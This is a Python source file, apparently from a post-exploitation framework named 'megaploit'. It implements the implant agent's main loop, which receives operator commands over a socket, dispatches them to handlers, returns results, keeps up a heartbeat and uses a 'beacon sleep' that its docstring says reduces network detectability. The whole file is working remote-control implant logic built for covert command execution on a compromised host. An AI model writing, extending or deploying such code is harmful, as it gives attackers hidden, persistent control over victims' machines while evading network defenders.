"""
megaploit.agent.shell
~~~~~~~~~~~~~~~~~~~~~
The main receive-execute-respond loop run by the agent after authentication.

Beacon sleep
------------
When ``beacon_sleep <n>`` is called from the operator, the agent's
``handlers._beacon_sleep`` module variable is updated.  The shell loop
checks this value after each command response and sleeps before polling
for the next command.  This reduces network detectability at the cost of
slightly higher command latency.
"""

from __future__ import annotations

import contextlib
import socket
import time

from megaploit.core.protocol import send_msg, recv_msg
from megaploit.agent.handlers import handle
import megaploit.agent.meterp  # noqa: F401 — registers advanced handlers on import


def run_shell(conn: socket.socket) -> None:
    """Block until the server sends 'exit' or the connection drops."""
    from megaploit.agent import handlers as _h

    # Start the background heartbeat PING sender (feature 6b)
    try:
        from megaploit.core.heartbeat import start_heartbeat
        start_heartbeat(conn, interval=30.0)
    except Exception:
        pass

    while True:
        try:
            cmd = recv_msg(conn)
        except (ConnectionError, OSError):
            break

        cmd = str(cmd)   # recv_msg may return any JSON type; ensure str for handle()

        if cmd == "exit":
            break

        try:
            response = handle(conn, cmd)
            if response is not None:
                send_msg(conn, response)
        except (ConnectionError, OSError):
            break
        except Exception as e:
            with contextlib.suppress(Exception):
                send_msg(conn, f"[-] Internal error: {e}")

        # Beacon sleep — pause between command polls to reduce network noise
        sleep_secs = getattr(_h, "_beacon_sleep", 0.0)
        if sleep_secs > 0:
            time.sleep(sleep_secs)
